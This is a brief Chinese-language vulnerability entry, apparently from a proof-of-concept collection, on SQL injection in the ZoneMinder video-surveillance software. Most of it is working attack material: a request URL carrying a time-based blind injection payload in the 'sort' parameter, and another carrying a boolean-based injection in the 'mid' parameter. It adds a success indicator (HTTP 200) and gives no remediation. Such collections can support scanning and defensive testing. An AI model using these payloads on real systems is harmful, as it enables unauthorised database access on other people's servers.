# ZoneMinder存在SQL注入漏洞

ZoneMinder ｜ SQL注入 ｜ —
- **请求**：`http://host:port/zm/index.php?sort=**if(now()=sysdate()%2Csleep(6)%2C0)**&order=desc&limit=20&view=request&request=watch&mid=1`

**Payload**
```
[http://host:port/zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request](http://host:port/zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request)
[https://github.com/ZoneMinder/zoneminder](https://github.com/ZoneMinder/zoneminder)
```
- **响应特征**：200